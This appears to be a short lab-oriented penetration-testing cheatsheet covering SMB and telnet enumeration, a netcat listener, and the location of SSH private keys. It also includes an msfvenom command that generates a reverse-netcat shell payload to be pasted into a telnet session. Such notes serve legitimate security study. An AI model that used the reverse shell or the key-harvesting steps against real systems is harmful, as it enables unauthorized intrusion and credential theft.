# Cheatsheet

### Common 
* ```wget http://127.0.0.1:8000/file```
* ```python3 -m http.server```
* ```systemctl stop myservice```

## Useful location  
  ### .ssh Key 
   * Private key ssh ```/home/user-name/.ssh```
   * This file is the private key ```id_rsa```
   * change the file permission ``` chmod 600 ```

  ### Nmap


# Fast Tool 
## Netcat
* nc -lvp [listening port], `nc -lvp 4444`


# Services  
## SMB
### Enumerating SMB
* enum4linux [options] ip
* use option  ```-a``` all of the above (full basic enumeration)

### SMB Exploit
* smbclient //[IP]/[SHARE]
* smbclient //10.10.10.2/sharefilename -U username -p 445
## Telnet
### Enumerating Telnet
* nmap
### Exploiting
* telnet [ip] [port]


# shells 
## Simple Shell msfvenom 


```
If using your own machine with the OpenVPN connection, use:
sudo tcpdump ip proto \\icmp -i tun0
If using the AttackBox, use:
sudo tcpdump ip proto \\icmp -i ens5


"msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"
-p = payload
lhost = our local host IP address (this is your machine's IP address)
lport = the port to listen on (this is the port on your machine)
R = export the payload in raw format
copy and paste the value on telnet session 
```


# other Important 
## Start a tcpdump listener

